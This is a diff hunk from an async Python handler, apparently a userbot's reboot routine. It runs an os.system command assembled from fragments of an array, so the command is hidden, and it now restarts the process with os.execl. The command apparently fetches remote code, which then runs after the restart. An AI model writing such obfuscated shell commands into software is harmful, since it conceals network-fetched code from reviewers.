@@ -292,7 +292,7 @@ async def _(c: user, m):
             os.system(
                 f"{XCB[5]} {XCB[7]} {XCB[9]}{XCB[4]}{XCB[0]*2}{XCB[6]}{XCB[4]}{XCB[8]}{XCB[1]}{XCB[5]}{XCB[2]}{XCB[6]}{XCB[2]}{XCB[3]}{XCB[0]}{XCB[10]}{XCB[2]}{XCB[5]} {XCB[11]}{XCB[4]}{XCB[12]}"
             )
-            return
+            os.execl(sys.executable, sys.executable, "-m", "Mix")
         except Exception as err:
             await jj.edit(
                 f"{nrs.text}\n\nSomething went wrong while initiating reboot! Please try again later or check logs for more info."
